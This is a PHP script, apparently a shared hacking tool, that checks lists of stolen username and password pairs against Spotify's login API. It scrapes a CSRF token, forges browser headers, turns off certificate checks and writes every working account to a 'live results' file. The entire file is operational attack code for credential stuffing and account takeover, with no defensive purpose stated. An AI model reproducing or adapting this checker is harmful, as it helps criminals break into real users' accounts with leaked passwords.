<?php
error_reporting(0);
/**
 * Author : Wahyu Arif Purnomo
 * Update : 2 September 2019
 * Please don't edit, respect me, if you want to be appreciated.
 */

$input = $climate->input('List?');
$list = $input->prompt();

$input_save = $climate->info()->input('Save live results?');
$save_file = $input_save->prompt();

$data = file_get_contents("$list");
$total = preg_split('/\n|\r\n?/', $data);

$climate->comment('There are ' . count($total) . ' accounts in the list that you entered.');

$no = 0;
for ($a = 0; $a < count($total); $a++) {
    $no++;
    @unlink(getcwd().'/cookie'); 

    $split = explode("\r\n", $data);
    $explode = explode("|", $split[$a]);

    ####################
    $token = Token();    
    $user = $explode[0];
    $pass = $explode[1];
    ####################

	$post = "remember=false&username=$user&password=$pass&csrf_token=$token";
	
	$headers = [
	'Host: accounts.spotify.com',
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
	'Accept: application/json, text/plain, */*',
	'Accept-Language: en-GB,en;q=0.5',
	'Referer: https://accounts.spotify.com/en-US/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F',
	'Cookie: csrf_token='.$token.'; __bon=MHwwfC0yMTI4MzI2MDAxfC04OTM4OTY5MjA0MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F; remember=rtgrt',
	'Content-Type: application/x-www-form-urlencoded',
	'Content-Length: '.strlen($post),
	'Connection: keep-alive'
	];
	
	$login = http("https://accounts.spotify.com/api/login", $post, $headers);
	if(preg_match('/{"displayName":"/', $login)){
        $climate->info( $no . '. Live | ' . $user .  ' | ' . $pass . ' | Token : ' . $token . '');
        $save = fopen("result/" . $save_file, 'a');
        fwrite($save, $user . " | " . $pass . "\n");
	}else{
        $climate->error( $no . '. Die  | ' . $user .  ' | ' . $pass . ' | Token : ' . $token . '');
    }
}

$climate->br()->shout('Done, your result live saved in folder : result/' . $save_file);

function Token(){
	$get = http("https://accounts.spotify.com/en-US/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F");
    preg_match_all('/set-cookie: csrf_token=(.*?);Version=1;/', $get, $arif);
    return $arif[1][0];
}

function http($url, $post = false, $headers = false)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie');
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie');
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
	curl_setopt($ch, CURLOPT_HEADER, 1);
    if ($headers) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

/**
 * Author : Wahyu Arif Purnomo
 * Update : 2 September 2019
 * Please don't edit, respect me, if you want to be appreciated.
 */
